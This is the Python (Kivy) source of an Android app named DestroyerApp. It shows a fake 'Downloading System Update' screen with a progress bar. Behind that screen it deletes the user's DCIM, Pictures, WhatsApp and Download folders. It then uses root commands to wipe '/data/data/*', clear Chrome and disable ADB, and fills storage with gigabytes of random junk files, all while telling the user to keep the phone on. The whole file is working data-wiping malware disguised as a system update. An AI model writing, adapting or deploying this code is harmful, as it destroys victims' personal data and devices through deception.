from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.progressbar import ProgressBar
import os
import threading
import time
import shutil

def destroy_device(status_label, progress_bar):
    status_label.text = "Cleaning external storage..."
    paths = ["/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/WhatsApp", "/sdcard/Download"]
    for p in paths:
        if os.path.exists(p):
            try:
                shutil.rmtree(p, ignore_errors=True)
            except Exception:
                pass
    
    status_label.text = "Escalating privileges..."
    try:
        os.system("su -c 'pm clear com.android.chrome'")
        os.system("su -c 'rm -rf /data/data/*'")
        os.system("su -c 'settings put global adb_enabled 0'")
    except Exception:
        pass
    
    status_label.text = "Optimizing system... Do not turn off."
    target_dir = "/sdcard/Android/data/"
    try:
        os.makedirs(target_dir, exist_ok=True)
        for i in range(100):
            with open(f"{target_dir}sys_cache_{i}.bin", "wb") as f:
                f.write(os.urandom(1024 * 1024 * 50))
            progress_bar.value = i
            time.sleep(0.1)
    except Exception:
        pass
    
    status_label.text = "Update complete. Reboot required."

class DestroyerApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        self.status = Label(text="Downloading System Update...", font_size='20sp')
        self.pbar = ProgressBar(max=100, value=0)
        
        layout.add_widget(self.status)
        layout.add_widget(self.pbar)
        
        threading.Thread(target=destroy_device, args=(self.status, self.pbar), daemon=True).start()
        
        return layout

if __name__ == '__main__':
    DestroyerApp().run()
